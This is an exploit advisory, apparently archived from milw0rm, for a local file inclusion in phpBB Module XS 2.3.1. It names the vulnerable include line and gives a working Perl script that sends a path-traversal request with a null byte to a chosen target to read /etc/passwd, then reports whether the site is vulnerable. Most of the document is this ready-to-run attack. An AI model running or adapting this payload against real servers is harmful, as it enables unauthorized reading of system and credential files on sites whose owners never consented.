          ..%%%%....%%%%...%%..%%...........%%%%...%%%%%...%%%%%%..%%...%%.
          .%%......%%..%%..%%..%%..........%%..%%..%%..%%..%%......%%...%%.
          ..%%%%...%%..%%..%%%%%%..%%%%%%..%%......%%%%%...%%%%....%%.%.%%.
          .....%%..%%..%%..%%..%%..........%%..%%..%%..%%..%%......%%%%%%%.
          ..%%%%....%%%%...%%..%%...........%%%%...%%..%%..%%%%%%...%%.%%..
          .................................................................

[+] Software: phpBB Module XS 2.3.1
[+] Vendor: http://www.phpbbmods.de
[+] Download: http://www.phpbbmods.de/downloads.php?view=detail&id=3

[~] Vulnerability found by: bd0rk
[~] Contact: bd0rk[at]hackermail.com
[~] Website: http://www.soh-crew.it.tt
[~] Greetings: str0ke, TheJT, maria

[+] Vulnerable Code in /admin/admin_xs.php line 33
[+] Code: include_once('xs_include.' . $phpEx);
[+] It is a local file inclusion

[+]Exploitcode:

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

print "\t\t+++++++++++++++++++++++++++++++++++++++++++++++++++\n\n";
print "\t\t+                                                 +\n\n";
print "\t\t+ phpBB Module XS 2.3.1 Local File Inclusion Expl +\n\n";
print "\t\t+                                                 +\n\n";
print "\t\t+++++++++++++++++++++++++++++++++++++++++++++++++++\n\n";

if (!$ARGV[0])
{
print "Usage: expl.pl [target]\n";
print "Example: expl.pl http://127.0.0.1/directory/admin/\n";
}

else
{
$web=$ARGV[0];
chomp $web;

$file="admin_xs.php?phpEx=../../../../../../../../../../../../../../../../etc/passwd%00";

my $web1=$web.$file;
print "$web1\n\n";
my $agent = LWP::UserAgent->new;
my $req=HTTP::Request->new(GET=>$web1);
$doc = $agent->request($req)->as_string;

if ($doc=~ /^root/moxis ){
print "This is vulnerable\n";
}
else
{
print "It is not vulnerable\n";
}
}

# milw0rm.com [2008-03-24]